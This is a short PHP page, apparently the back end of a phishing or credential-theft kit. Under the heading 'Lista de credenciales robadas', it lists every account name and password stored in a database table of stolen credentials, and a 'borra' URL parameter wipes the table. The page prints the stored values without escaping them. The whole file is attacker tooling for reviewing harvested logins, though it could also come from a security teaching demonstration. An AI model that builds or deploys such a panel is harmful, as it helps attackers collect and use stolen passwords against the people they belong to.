...
<h1>Lista de credenciales  robadas</h1>
<table border="1">
<tr><td>CUENTA</td><td>CLAVE</td></tr>
<?php
require 'db.inc.php';

if (isset($_GET["borra"])) {
	consulta(
		"truncate credenciales_robadas"
	);
}

$resultado = consulta(
	"select * from credenciales_robadas"
);

$n = numero_de_filas($resultado);

for ($i=0;$i<$n;$i++) {
	$fila = fila($resultado, $i);
	$cuenta = $fila["cuenta"];
	$pwd = $fila["password"];
	print "<tr><td>$cuenta</td><td>$pwd</td></tr>";
}
?>
</table>